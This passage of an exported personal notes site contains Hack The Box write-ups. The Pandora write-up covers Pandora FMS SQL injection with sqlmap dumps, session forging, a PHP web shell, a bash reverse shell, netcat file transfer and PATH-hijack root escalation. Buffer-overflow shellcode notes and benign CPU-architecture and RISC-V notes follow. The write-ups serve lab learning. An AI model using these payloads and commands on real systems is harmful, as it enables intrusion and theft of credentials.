[this](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/) online, which points to [CVE-2021-32099](https://github.com/ibnuuby/CVE-2021-32099).\n\nWe need to do something like:\n\n```bash\nlocalhost:8000/pandora_console/include/chart_generator.php?session_id=\u003cinjection\u003e\n\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' or 1=1-- d\n```\n\nIt doesn't show `Access Not Granted` so promising. Let's try **Burp**. We intercept it, modify it a bit and save it to file to run `sqlmap`:\n\n![Screenshot from 2022-07-18 12-52-54](notes/images/Screenshot%20from%202022-07-18%2012-52-54.png)\n\nWe can now check if it is injectable:\n\n```bash\nsqlmap -r pandora.req --batch\n\nGET parameter 'session_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 251 HTTP(s) requests:\n---\nParameter: session_id (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)\n    Payload: session_id=-6261' OR 8367=8367#\n\n    Type: error-based\n    Title: MySQL \u003e= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: session_id=1' OR (SELECT 6089 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(6089=6089,1))),0x7170706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mNaD\n\n    Type: time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: session_id=1' AND (SELECT 2057 FROM (SELECT(SLEEP(5)))MjXV)-- agCG\n---\n[12:54:37] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)\nweb application technology: Apache 2.4.41, PHP\nback-end DBMS: MySQL \u003e= 5.0 (MariaDB fork)\n[12:54:38] [INFO] fetched data logged to text files under '/home/hanato/.local/share/sqlmap/output/localhost'\n\n[*] ending @ 12:54:38 /2022-07-18/\n\n---\n\nsqlmap -r pandora.req --batch -D pandora --tables\n\n+------------------------------------+\n| taddress                           |\n| taddress_agent                     |\n| tagent_access                      |\n| tagent_custom_data                 |\n| tagent_custom_fields               |\n| tagent_custom_fields_filter        |\n| tagent_module_inventory            |\n| tagent_module_log                  |\n| tagent_repository                  |\n| tagent_secondary_group             |\n| tagente                            |\n| tagente_datos                      |\n| tagente_datos_inc                  |\n| tagente_datos_inventory            |\n| tagente_datos_log4x                |\n| tagente_datos_string               |\n| tagente_estado                     |\n| tagente_modulo                     |\n| talert_actions                     |\n| talert_commands                    |\n| talert_snmp                        |\n| talert_snmp_action                 |\n| talert_special_days                |\n| talert_template_module_actions     |\n| talert_template_modules            |\n| talert_templates                   |\n| tattachment                        |\n| tautoconfig                        |\n| tautoconfig_actions                |\n| tautoconfig_rules                  |\n| tcategory                          |\n| tcluster                           |\n| tcluster_agent                     |\n| tcluster_item                      |\n| tcollection                        |\n| tconfig                            |\n| tconfig_os                         |\n| tcontainer                         |\n| tcontainer_item                    |\n| tcredential_store                  |\n| tdashboard                         |\n| tdatabase                          |\n| tdeployment_hosts                  |\n| tevent_alert                       |\n| tevent_alert_action                |\n| tevent_custom_field                |\n| tevent_extended                    |\n| tevent_filter                      |\n| tevent_response                    |\n| tevent_rule                        |\n| tevento                            |\n| textension_translate_string        |\n| tfiles_repo                        |\n| tfiles_repo_group                  |\n| tgis_data_history                  |\n| tgis_data_status                   |\n| tgis_map                           |\n| tgis_map_connection                |\n| tgis_map_has_tgis_map_con          |\n| tgis_map_layer                     |\n| tgis_map_layer_groups              |\n| tgis_map_layer_has_tagente         |\n| tgraph                             |\n| tgraph_source                      |\n| tgraph_source_template             |\n| tgraph_template                    |\n| tgroup_stat                        |\n| tgrupo                             |\n| tincidencia                        |\n| titem                              |\n| tlanguage                          |\n| tlayout                            |\n| tlayout_data                       |\n| tlayout_template                   |\n| tlayout_template_data              |\n| tlink                              |\n| tlocal_component                   |\n| tlog_graph_models                  |\n| tmap                               |\n| tmensajes                          |\n| tmetaconsole_agent                 |\n| tmetaconsole_agent_secondary_group |\n| tmetaconsole_event                 |\n| tmetaconsole_event_history         |\n| tmetaconsole_setup                 |\n| tmigration_module_queue            |\n| tmigration_queue                   |\n| tmodule                            |\n| tmodule_group                      |\n| tmodule_inventory                  |\n| tmodule_relationship               |\n| tmodule_synth                      |\n| tnetflow_filter                    |\n| tnetflow_report                    |\n| tnetflow_report_content            |\n| tnetwork_component                 |\n| tnetwork_component_group           |\n| tnetwork_map                       |\n| tnetwork_matrix                    |\n| tnetwork_profile                   |\n| tnetwork_profile_component         |\n| tnetworkmap_ent_rel_nodes          |\n| tnetworkmap_enterprise             |\n| tnetworkmap_enterprise_nodes       |\n| tnews                              |\n| tnota                              |\n| tnotification_group                |\n| tnotification_source               |\n| tnotification_source_group         |\n| tnotification_source_group_user    |\n| tnotification_source_user          |\n| tnotification_user                 |\n| torigen                            |\n| tpassword_history                  |\n| tperfil                            |\n| tphase                             |\n| tplanned_downtime                  |\n| tplanned_downtime_agents           |\n| tplanned_downtime_modules          |\n| tplugin                            |\n| tpolicies                          |\n| tpolicy_agents                     |\n| tpolicy_alerts                     |\n| tpolicy_alerts_actions             |\n| tpolicy_collections                |\n| tpolicy_groups                     |\n| tpolicy_modules                    |\n| tpolicy_modules_inventory          |\n| tpolicy_plugins                    |\n| tpolicy_queue                      |\n| tprofile_view                      |\n| tprovisioning                      |\n| tprovisioning_rules                |\n| trecon_script                      |\n| trecon_task                        |\n| trel_item                          |\n| tremote_command                    |\n| tremote_command_target             |\n| treport                            |\n| treport_content                    |\n| treport_content_item               |\n| treport_content_item_temp          |\n| treport_content_sla_com_temp       |\n| treport_content_sla_combined       |\n| treport_content_template           |\n| treport_custom_sql                 |\n| treport_template                   |\n| treset_pass                        |\n| treset_pass_history                |\n| tserver                            |\n| tserver_export                     |\n| tserver_export_data                |\n| tservice                           |\n| tservice_element                   |\n| tsesion                            |\n| tsesion_extended                   |\n| tsessions_php                      |\n| tskin                              |\n| tsnmp_filter                       |\n| ttag                               |\n| ttag_module                        |\n| ttag_policy_module                 |\n| ttipo_modulo                       |\n| ttransaction                       |\n| ttrap                              |\n| ttrap_custom_values                |\n| tupdate                            |\n| tupdate_journal                    |\n| tupdate_package                    |\n| tupdate_settings                   |\n| tuser_double_auth                  |\n| tuser_task                         |\n| tuser_task_scheduled               |\n| tusuario                           |\n| tusuario_perfil                    |\n| tvisual_console_elements_cache     |\n| twidget                            |\n| twidget_dashboard                  |\n+------------------------------------+\n\n[12:57:46] [INFO] fetched data logged to text files under '/home/hanato/.local/share/sqlmap/output/localhost'\n\n---\n\nsqlmap -r pandora.req --batch -D pandora -T usuario --dump\n\n```\n\nLet's also try:\n\n```bash\ntime sqlmap -r pandora.req --dump -D pandora --batch --thread 10\n```\n\nAnd see how long it take. We can look at the output using `less` by running:\n\n```bash\nless ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv -S\n```\n\n- `-S`: line breaks.\n\nNow we have:\n\n```bash\nmatt@pandora.htb f655f807365b6dc602b31ab3d6d43acc\ndaniel@pandora.htb 76323c174bd49ffbbdedf678f6cc89a6\n```\n\nWe can do:\n\n```bash\nsqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump\n```\n\nTo find out the sessions! We will take one:\n\n```bash\n| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |\n```\n\nAnd put it in the URL, like so `http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq` and refresh `http://localhost:8000/pandora_console/`. We get it!\n\n![Screenshot from 2022-07-18 13-13-50](notes/images/Screenshot%20from%202022-07-18%2013-13-50.png)\n\nMatt doesn't seem to be an admin. Let's try some other things.\n\nWe can do:\n\n```bash\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1-- -\n```\n\nBecause we have 3 `tsessions_php` entries, we enter:\n\n```bash\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1,2,3-- -\n```\n\nWhich gets rid of the error message. Now we can do:\n\n```bash\nhttp://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27--%20-\n```\n\nAnd we are in! We can see that the in `Admin tools -\u003e File manager` we get put in `/images/`, so lets try to upload something there. The URL is `http://localhost:8000/pandora_console/images/`. Our shell:\n\n```php\n\u003c?php                                                                             \nsystem($_REQUEST['cmd']);                                                                                                                                                                                                                   \n?\u003e\n```\n\nWe can upload it, then execute it. It doesn't display anything but we can run `http://localhost:8000/pandora_console/images/shell.php?cmd=whoami` and we get `matt`!\n\nWe can open it in **Burp**, send it to the `Repeater` and convert the request type to **POST**. Then we change `cmd` to:\n\n```bash\ncmd=bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.12/9001 0\u003e\u00261'\n```\n\nMake sure to `ctrl+u` it to encode it to URL. We are in!\n\n```bash\n~/htb/pandora \u003e nc -nlvp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.11.136 59342\nbash: cannot set terminal process group (871): Inappropriate ioctl for device\nbash: no job control in this shell\nmatt@pandora:/var/www/pandora/pandora_console/images$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\u003cges$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  \n```\n\nThen we `ctrl+z` it and run:\n\n```bash\nstty raw -echo; fg\n\nENTER\nENTER\n```\n\nNow we have proper shell.\n\nWe can run **LinPEAS**. We download it, then run a `python http` server and curl from it:\n\n```bash\ncurl http://10.10.14.12:8001/linpeas.sh | bash\n```\n\nThere's this:\n\n```bash\n╔══════════╣ Executing Linux Exploit Suggester\n╚ https://github.com/mzet-/linux-exploit-suggester\n[+] [CVE-2021-4034] PwnKit\n\n   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n   Exposure: probable\n   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro\n   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\n```\n\nFrom their website: We discovered a Local Privilege Escalation (from any user to root) in\npolkit's pkexec, a SUID-root program that is installed by default on\nevery major Linux distribution:\n\n\"Polkit (formerly PolicyKit) is a component for controlling system-wide\nprivileges in Unix-like operating systems. It provides an organized way\nfor non-privileged processes to communicate with privileged ones. [...]\nIt is also possible to use polkit to execute commands with elevated\nprivileges using the command pkexec followed by the command intended to\nbe executed (with root permission).\" (Wikipedia)\n\nSo we check for `pkexec`!\n\n```bash\nmatt@pandora:/home/matt$ pkexec --version\npkexec version 0.105\n```\n\nNice. We also see:\n\n```bash\n╔══════════╣ SUID - Check easy privesc, exploits and write perms\n╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid\nstrings Not Found\n-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup (Unknown SUID binary)\n```\n\nMatt seems to have access to it.\n\n```bash\nmatt@pandora:/home/matt$ file /usr/bin/pandora_backup   \n/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped\n```\n\nWe can `netcat` the file over:\n\n```bash\nmatt@pandora:/home/matt$ nc 10.10.14.12 9002 \u003c /usr/bin/pandora_backup\n\n~/htb/pandora \u003e nc -nlvp 9002 \u003e pandora_backup\nListening on 0.0.0.0 9002\nConnection received on 10.10.11.136 36352\n\n~/htb/pandora \u003e md5sum pandora_backup \n172b42e4a9c9de0d155c357c733ff80f  pandora_backup\n\nmatt@pandora:/home/matt$ md5sum /usr/bin/pandora_backup \n172b42e4a9c9de0d155c357c733ff80f  /usr/bin/pandora_backup\n```\n\nHowever when we try to run it:\n\n```bash\nmatt@pandora:/home/matt$ /usr/bin/pandora_backup \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\ntar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied\ntar: Error is not recoverable: exiting now\nBackup failed!\nCheck your permissions!\n```\n\nWe can run **strings** on it and find `tar`:\n\n```bash\nNow attempting to backup PandoraFMS client\ntar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_consol\n```\n\nSo it is vulnerable to path injection. But we can:\n\n```bash\nmatt@pandora:/home/matt$ echo /bin/bash \u003e tar\nmatt@pandora:/home/matt$ tar\ntar: You must specify one of the '-Acdtrux', '--delete' or '--test-label' options\nTry 'tar --help' or 'tar --usage' for more information.\n```\n\nWe can add our directory to PATH:\n\n```bash\nmatt@pandora:/home/matt$ export PATH=/home/matt:$PATH \nmatt@pandora:/home/matt$ echo $PATH                  \n/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nmatt@pandora:/home/matt$ chmod +x tar\nmatt@pandora:/home/matt$ which tar\n/home/matt/tar\n\nmatt@pandora:/home/matt$ /usr/bin/pandora_backup        \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\n```\n\nBAMMN! We can do create a `.ssh/` dir in matt and then:\n\n```bash\nssh-keygen -f matt\n```\n\nSend it to matt via a `python http` server. We move it to `authorised_keys` and then ssh into it.\n\nNow we can actually do:\n\n```bash\nmatt@pandora: export PATH=$(pwd)=$PATH\n\nmatt@pandora:/home/matt$ /usr/bin/pandora_backup        \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\n```\n\nAnd we are root!!",
    "lastmodified": "2022-11-24T12:20:59.64343369Z",
    "tags": null
  },
  "/notes/general/htb-secret": {
    "title": "HTB - Secret",
    "content": "# HTB - Secret\n---\nIt is all about secret ways to extract information from applications.\n\n```bash\n~/htb/secret \u003e sudo nmap -sC -sV -oA nmap/secret 10.10.11.120\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 17:22 BST\nNmap scan report for 10.10.11.120\nHost is up (0.038s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)\n|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)\n|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)\n80/tcp   open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: DUMB Docs\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n3000/tcp open  http    Node.js (Express middleware)\n|_http-title: DUMB Docs\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.41 seconds\n```\n\nWe can intercept the http://10.10.11.120/docs#section-3 page and send a POST request:\n\n```bash\nPOST /api/user/register HTTP/1.1\nHost: 10.10.11.120\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.11.120/\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 89\n\n\n{\n\t\"name\": \"hanato\",\n\t\"email\": \"root@morioh.cool\",\n\t\"password\": \"Kekc8swFgD6zU\"\n}\n```\n\nWe do:\n\n```bash\nPOST /api/user/login HTTP/1.1\nHost: 10.10.11.120\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.11.120/\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 71\n\n{\n\t\"email\": \"root@morioh.cool\",\n\t\"password\": \"Kekc8swFgD6zU\"\n  }\n```\n\nAnd we get:\n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Mon, 18 Jul 2022 16:30:19 GMT\nContent-Type: text/html; charset=utf-8\nConnection: close\nX-Powered-By: Express\nauth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmQ1OGEyMjM4OWQ5YjA0NjIyMGEyYzMiLCJuYW1lIjoiaGFuYXRvIiwiZW1haWwiOiJyb290QG1vcmlvaC5jb29sIiwiaWF0IjoxNjU4MTYxODE5fQ.7YA3c9iLmpHa-RUjWVtDOll-_jptoAj4IrH3JMQogmw\nETag: W/\"cf-R75sH2ooX2bWBo5FI5RKlFE4DEc\"\nContent-Length: 207\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmQ1OGEyMjM4OWQ5YjA0NjIyMGEyYzMiLCJuYW1lIjoiaGFuYXRvIiwiZW1haWwiOiJyb290QG1vcmlvaC5jb29sIiwiaWF0IjoxNjU4MTYxODE5fQ.7YA3c9iLmpHa-RUjWVtDOll-_jptoAj4IrH3JMQogmw\n```\n\nWe can decode it:\n\n![Screenshot from 2022-07-18 17-31-38](notes/images/Screenshot%20from%202022-07-18%2017-31-38.png)",
    "lastmodified": "2022-11-24T12:20:59.684695363Z",
    "tags": null
  },
  "/notes/general/htb-stack-based-overflow-linux": {
    "title": "Stack-based Overflow - Linux x86",
    "content": "# Stack-based Overflow - Linux x86\n---\nThey are caused by incorrect program code, which cannot process too large amounts of data correctly by the CPU and can, therefore, manipulate the CPU's processing.\n\nFor example if too much data is written to a reserved memory **buffer** or **stack** that it is not limited, then the specific registers will be overwritten, which may allow code to be executed.\n\nA buffer overflow can overwrite the specific program's **return address** with arbitrary data, allowing an attacker to execute commands with the **privileges of the process** vulnerable to the buffer overflow by passing arbitrary machine code.\n\n- [CPU Architecture](notes/general/cpu-architecture.md)\n    - [Stacks and Queues](notes/general/stack.md)\n    - [Endianness](notes/general/endianness.md)\n- [GDB](notes/general/gdb.md)\n- [Take Control of EIP](notes/general/take-control-eip.md)\n- [Generate Shellcode](notes/general/generate-shellcode.md)\n- [Identification of the Return Address](notes/general/identify-return-address.md)\n- [Prevention Techniques and Mechanisms](notes/general/so-prevention-techniques.md)\n\n## CPU Architecture\nA **Von-Neumann** architecture consists of four functional units:\n- Memory\n- Control Unit\n- Arithmetic Logical Unit\n- Input/Output Unit\n\nThe most important units, **Arithmetic Logical Unit** (ALU) and **Control Unit** (CU), are combined in the actual **Central Processing Unit** (CPU).\n\n## Memory\n### Primary\nIt is the **cache** and the **Random Access Memory** (RAM).\n\nThe cache is integrated into the processor and serves as a buffer. Before the program code and data enter the processor for processing the RAM serves as data storage.\n\nWhen the primary memory loses power, all stored contents are lost.\n\n### Secondary\nThis is the external data storage,  such as **HDD/SSD**, **Flash Drives** and **CD/DVD-ROMs** of a computer, which is **not** directly accessed by the CPU, but via the **I/O** interfaces.\n\n## Control Unit\nIt is responsible for the correct interworking of the processor's individual parts. The tasks can be summarised as:\n\n- Reading data from the RAM\n- Saving data in RAM\n- Provide, decode and execute an instruction\n- Processing the inputs from peripheral devices\n- Processing of outputs to peripheral devices\n- Interrupt control\n- Monitoring of the entire system\n\nThe **CU** contains the **Instruction Register** (IR), which contains all instructions that the processor decodes and executes. The instruction decoder translates the instruction and passes them to the execution unit, which then executes the instruction. The execution unit transfers the data to the **ALU** for calculation and receives the result back from there.\n\nData used during execution temporarily is stored in **registers**.\n\n## Central Processing Unit\nIt provides the actual processing power. It fetches commands from memory one after the other and initiates data processing.\n\nThe processor is also often referred to as **microprocessor** when placed in a single electronic circuit, as in our PCs.\n\nThe best-known **CPU architectures** are:\n- x86/i386 - (AMD and Intel)\n- x86-64/amd64 - (Microsoft and Sun)\n- ARM - (Acorn)\n\nEach of them is built in a specific way, called **Instruction Set Architecture** (ISA). It describes the behaviour of a CPU concerning the instruction set used. Above all, ISA gives us the possibility to understand the unified behaviour of **machine code** in **assembly language** concerning **registers**, **data types** etc.\n\nThere are four different types of ISA:\n- CISC - Complex Instruction Set Computing\n- RISC - Reduced Instruction Set Computing\n- VLIW - Very Long Instruction Word\n- EPIC - Explicitly Parallel Instruction Computing\n\n## Instruction Cycle\n| Instruction                | Description                                                                                                                                    |\n| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |\n| Fetch                      | Read from the **Instruction Address Register** (IAR) then load from the **cache** or **RAM** into the **Instruction Register** (IR).           |\n| Decode                     | Converts instruction and starts to execute.                                                                                                    |\n| Fetch Operands             | If further data needs to be loaded, load from **cache** or **RAM**.                                                                            |\n| Execute                    | The instruction is executed. It could be operations in the ALU for example, or the control of peripheral devices.                              |\n| Update Instruction Pointer | If no jump has been executed, the **IAR** is now increased by the length of the instruction so that it points to the next machine instruction. |\n\u003e\u003e\u003e\u003e\u003e\u003e\u003e e671289f5537f91a2b4e49523f95459c6288c3fc\n",
    "lastmodified": "2022-11-24T12:20:59.697609305Z",
    "tags": null
  },
  "/notes/general/identify-return-address": {
    "title": "Identify Return Address",
    "content": "# Identify Return Address\n---\nWe need a memory address where our NOPs are located to tell the EIP to jump to it. It must not contain any of the bad characters found.\n\n- NOPS:\n```bash\n(gdb) x/2000xb $esp+1400\n\n\u003cSNIP\u003e\n0xffffd5ec:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\n0xffffd5f4:\t0x55\t0x55\t0x55\t0x55\t0x55\t0x55\t0x90\t0x90\n\t\t\t\t\t\t\t\t# End of \"\\x55\"s   ----\u003e|  |---\u003e NOPS\n0xffffd5fc:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd604:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd60c:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd614:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd61c:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd624:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd62c:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd634:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd63c:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd644:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd64c:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd654:\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\t0x90\n0xffffd65c:\t0x90\t0x90\t0xda\t0xca\t0xba\t0xe4\t0x11\t0xd4\n\t\t\t\t\t\t # |---\u003e Shellcode\n\u003cSNIP\u003e\n```\n\nWe have to choose an address to which we refer the **EIP** and which reads and executes one byte after the other starting at this address. In this example, we take `0xffffd64c`, it looks like this:\n\n![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)\n\nWe then replace our `\\x66` which overwrites the EIP to tell it to jump to the `0xffffd64c` address:\n\n```\nBuffer = \"\\x55\" * (1040 - 124 - 95 - 4) = 841\nNOPs = \"\\x90\" * 124\nShellcode = \"\\xda\\xca\\xba\\xe4\\x11\\xd4...\u003cSNIP\u003e...\\x5a\\x22\\xa2\"\nEIP = \"\\x4c\\xd6\\xff\\xff\"\n```\n\nSince our shellcode creates a reverse shell, we let **netcat** listen on port 31337:\n\n```bash\nnc -nlvp 31337\n```\n\nThen we run our exploit again:\n\n```bash\n(gdb) run $(python -c 'print \"\\x55\" * (1040 - 124 - 95 - 4) + \"\\x90\" * 124 + \"\\xda\\xca\\xba...\u003cSNIP\u003e...\\x5a\\x22\\xa2\" + \"\\x4c\\xd6\\xff\\xff\"')\n```",
    "lastmodified": "2022-11-24T12:20:59.721896887Z",
    "tags": null
  },
  "/notes/general/inkblot-algorithm": {
    "title": "Inkblot Algorithm",
    "content": "# Inkblot Algorithm\n---\nCouldn't find much online about it, but I think it's a \"populating\" algorithm to find a path (A-\u003eB).\n\n## Maze\n![inkblot-1](notes/images/inkblot-1.png)\n\n![inkblot-2](notes/images/inkblot-2.png)\n\n## Recording the Path\nUse recursion and an accumulator.\n\n```c\nstruct path\n{\n  int x;\n  int y;\n  struct path *next;\n}\n```\n\n```c\nstruct route *\nblot (int x, int y, struct path *route)\n{\n  struct node *n = (struct node *) malloc (sizeof (*n));\n  if (x,y) is destination\n  {\n    n-\u003ex = x, n-\u003ey = y, n-\u003eroute = route;\n    return n;\n  }\n  else\n    for (each point (a,b) adjacent to (x,y)\n    {\n      n-\u003ex = x; n.y = y; n-\u003eroute = route;\n      newroute = blot (a, b, n);\n      if (newroute)\n        return newroute:\n    }\n  free (n);  /* Failure, give back node */\n  return NULL;\n}\n```\n\n## Contours\nWant the intermediate contour.\n\nInkblot from both sides until meet, may get artefacts but will be optimal.\n\n![contours](notes/images/contours.png)\n",
    "lastmodified": "2022-11-24T12:20:59.813866138Z",
    "tags": null
  },
  "/notes/general/instruction-set-semantics": {
    "title": "Instruction Set Semantics",
    "content": "# Instruction Set Semantics\n---\nMost general is the **three address instruction set**:\n\n`result = operand1 operator operand2` ^44cfb5\n\n**Two address instruction sets** use one of the operand addresses for the **result**.\n\n**One address instruction sets** have a fixed register for one operand and the result, usually known as the _accumulator_.\n\n**Zero address instruction sets** work by popping arguments from a stack in main memory and pushing the results back.\n\nModern RISC designs are **three address instruction sets**. One address instruction sets are found in DSPs (Digital Signal Processors).\n\n## See Also\n- [Compilers](notes/general/compilers.md)",
    "lastmodified": "2022-11-24T12:20:59.83426857Z",
    "tags": null
  },
  "/notes/general/intermediate-representations": {
    "title": "Intermediate Representations",
    "content": "# Intermediate Representations\n---\nThere are three main ones:\n- [Parse Trees](notes/general/parse-trees.md)\n- [](notes/general/parse-trees.md#DAGs%20for%20Parse%20Trees%7CDAGs)\n- [Three Address Code](notes/general/three-address-code.md)",
    "lastmodified": "2022-11-24T12:20:59.878743529Z",
    "tags": null
  },
  "/notes/general/introduction-to-riscv": {
    "title": "Introduction to RISC-V",
    "content": "# Introduction to RISC-V\n---\n\nNotes on the [Introduction to RISC-V](https://learning.edx.org/course/course-v1:LinuxFoundationX+LFD110x+1T2021/home) LinuxFoundation course.\n\n* [](notes/general/introduction-to-riscv.md#Chapter%201%20-%20Getting%20to%20know%20RISC-V%7CChapter%201) - Getting to know RISC-V\n* [](notes/general/introduction-to-riscv.md#Chapter%202%20-%20The%20RISC-V%20Story%7CChapter%202) - The RISC-V Story\n* [](notes/general/introduction-to-riscv.md#Chapter%203%20-%20The%20RISC-V%20Community%7CChapter%203) - The RISC-V Community\n* [](notes/general/introduction-to-riscv.md#Chapter%204%20-%20Developing%20RISC-V%7CChapter%204) - Developing RISC-V\n* [](notes/general/introduction-to-riscv.md#Chapter%205%20-%20RISC-V%20In%20Practice%7CChapter%205) - RISC-V in Practice\n\n---\n## Chapter 1 - Getting to know RISC-V\n### Overview\n* Difference between RISC-V [ISA](notes/general/isa.md) and RISC-V international.\n* Description of the organisation around the RISC-V community.\n* Goals of RISC-V international as a community-driven organisation.\n\n### What is RISC-V?\n[RISC](https://en.wikipedia.org/wiki/Reduced_instruction_set_computer) is short for **Reduced Instruction Set Computer** as was designed in the 1980s.\n\nRISC-V can refer to different things:\n  - The Instruction Set Architecture ([ISA](notes/general/isa.md))\n  * The community of users and developers who develop and use the [ISA](notes/general/isa.md).\n  * The RISC-V International Association that manages the [ISA](notes/general/isa.md).\n  * The hardware and IP products built on the [ISA](notes/general/isa.md).\n\n### The RISC-V Community\nEveryone shares a common interest in developing an **openly** available instruction set architecture specification and the ecosystem around it, including:\n\n- Physical hardware - processors, development boards, System-on-Chips (SoCs), System-on-Modules (SoMs), and other physical systems\n- “Soft” IP processor cores that can be loaded into emulators or onto field-programmable gate array (FPGAs), or written in silicon\n- The entire software stack, from boot-loaders and firmware up to full operating systems and applications\n- Educational materials, including courseware, curricula, lesson plans, online courses like this one, tutorials, podcasts, lab assignments, even books\n- Services, including verification, custom board design, and many more\n\nAll of this community output is recognised on the RISC-V Exchange, an organised section on the RISC-V website that describes the ecosystem in terms of available hardware and software, services, learning materials, and discussion points.\n\n### RISC-V Internation\nThe RISC-V community spans over more than 40 countries and RISC-V international is a Swiss non-profit organisation.\n\nRISC-V international does not produce hardware, they provide the basics for all of its members organisations to create new technology based on the foundational support of the RISC-V [ISA](notes/general/isa.md).\n\n## Chapter 2 - The RISC-V Story\n### Overview\n- How the RISC-V Instruction Set Architecture was created.\n- The structure of RISC-V international.\n- How member organisations work together to develop an open source community.\n\n### How it all started\nIt started at UC Berkeley Parallel Computing Lab while discussing the importance of open source and open standards.\n\n### Importance of Open Source and Open Standards\nBecause technology does not persist in isolation - as the world becomes more complex and connected, global standards ensure that society realises the benefits of interoperability from the inventor to the consumer.\n\n[Tim Berners-Lee](https://en.wikipedia.org/wiki/Tim_Berners-Lee) for example led a revolution to standardise the protocols we use on the internet (HTML, URL, 